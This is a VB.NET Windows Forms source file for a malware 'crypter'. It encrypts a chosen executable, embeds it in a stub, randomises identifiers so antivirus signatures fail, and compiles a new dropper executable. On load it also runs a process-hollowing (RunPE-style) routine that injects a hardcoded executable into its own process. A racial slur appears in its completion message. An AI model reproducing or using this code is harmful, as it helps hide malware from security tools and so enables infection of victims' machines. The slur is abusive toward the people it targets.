Imports WMPLib
Imports System.IO
Imports Microsoft.VisualBasic.ApplicationServices

Public Class Form1
    Dim OriginalFile, Crypted, Stub, SaveFile, EncryptedString, StubIcon As String
    Dim Player As WindowsMediaPlayer = New WindowsMediaPlayer
    Dim urls() As String = {"https://raw.githubusercontent.com/F2C-KrypteX/Scratch-Runtime-Crypter/master/Master/onandon.mp3", "https://raw.githubusercontent.com/F2C-KrypteX/Scratch-Runtime-Crypter/master/Master/colorblind.mp3", "http://afonsosolitaire.free.fr/Musicas/Inglaise/Pump%20It%20Up.mp3", "https://raw.githubusercontent.com/F2C-KrypteX/Scratch-Runtime-Crypter/master/Master/skyslimit.mp3"}
    Public Event Startup(sender As Object, e As StartupEventArgs)
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        run()
        Try
            Player.URL = urls(3)
            Player.controls.stop()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub form1_click(sender As Object, e As EventArgs) Handles Me.Click
        If Player.URL = urls(3) Then
            Player.URL = urls(2)
        Else
            If Player.URL = urls(2) Then
                Player.URL = urls(1)
            Else
                If Player.URL = urls(1) Then
                    Player.URL = urls(0)
                Else
                    If Player.URL = urls(0) Then
                        Player.URL = urls(3)
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Player.controls.play()
        Try
            Using fo As New OpenFileDialog()
                fo.RestoreDirectory = True
                fo.Multiselect = False
                fo.Filter = "Executable *.exe|*.exe"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then OriginalFile = fo.FileName
                TextBox1.Text = OriginalFile
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Using fo As New SaveFileDialog()
                fo.RestoreDirectory = True
                fo.Filter = "Executable *.exe|*.exe"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then SaveFile = fo.FileName
                TextBox2.Text = SaveFile
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Using fo As New OpenFileDialog()
                fo.RestoreDirectory = True
                fo.Multiselect = False
                fo.Filter = "Icon *.ico|*.ico"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then StubIcon = fo.FileName
                TextBox3.Text = StubIcon
                write("C:\tmp.ico", IO.File.ReadAllBytes(StubIcon))
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Stub As String = My.Resources.bubby ' Declaring our stub source
        Dim originalbytes As Byte() = File.ReadAllBytes(OriginalFile)
        Dim Key As String = ToolBox.EncryptText(ToolBox.PassGen(30), (ToolBox.PassGen(30)))
        Dim DropFile As String = (ToolBox.StringGen(9)) ' Our DropFile
        Dim Base64String As String = Convert.ToBase64String(IO.File.ReadAllBytes(OriginalFile)) ' converts our original file into a Text-Readable Base 64 String.
        EncryptedString = ToolBox.EncryptText(Base64String, Key) ' Encrypt Our Base 64 String!
        Dim respath As String = Application.StartupPath & "\" & "payload.resources"
        Using r As New Resources.ResourceWriter(respath)
            r.AddResource("payload", EncryptedString)
            r.Generate()
        End Using
        ' Generate Random Assembly Information
        Stub = Stub.Replace("ΦA1Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦA2Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦA3Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦA4Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦA5Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦA6Φ", ToolBox.StringGen(14))
        ' Generate Random Strings for a more unique output.
        Stub = Stub.Replace("ΦGtmBoiiΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦThisKeyΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦDcryptdΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦDropStringΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦappdataΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦwriteΦ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦN1Φ", ToolBox.StringGen(12))
        Stub = Stub.Replace("ΦM1Φ", ToolBox.StringGen(8))
        Stub = Stub.Replace("ΦF1Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦIn1Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦIn2Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦIn3Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦIn4Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS1Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS2Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS3Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS4Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS5Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS6Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS7Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS8Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS9Φ", ToolBox.StringGen(14))
        ' End Random String Generation
        Stub = Stub.Replace("ΦKSKpPsbΦ", ToolBox.format(EncryptedString))
        Stub = Stub.Replace("ΦJZtSgktΦ", Key)
        Stub = Stub.Replace("ΦDropFileΦ", DropFile)
        Clipboard.SetText(Stub) ' Allow for Debugging of Stub Code.
        ToolBox.Compile(SaveFile, Stub)
        IO.File.Delete("C:\tmp.ico")
        MsgBox("Nigga You Sneeky")
        Dim ΦThisKeyΦ As Object = Nothing
        Dim ΦGtmBoiiΦ As Object = Nothing
    End Sub
    Private Function write(ByVal path As String, ByVal data As Byte())
        Try
            File.WriteAllBytes(path, data)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Function
    Public Shared Function run()
        Dim PE As New MenaPE
        PE.Run(Process.GetCurrentProcess.MainModule.FileName, IO.File.ReadAllBytes("S:\Users\V\Documents\Visual Studio 2015\Projects\Tools\Resource Hacker\ResHacker.exe"), &H10)
    End Function
End Class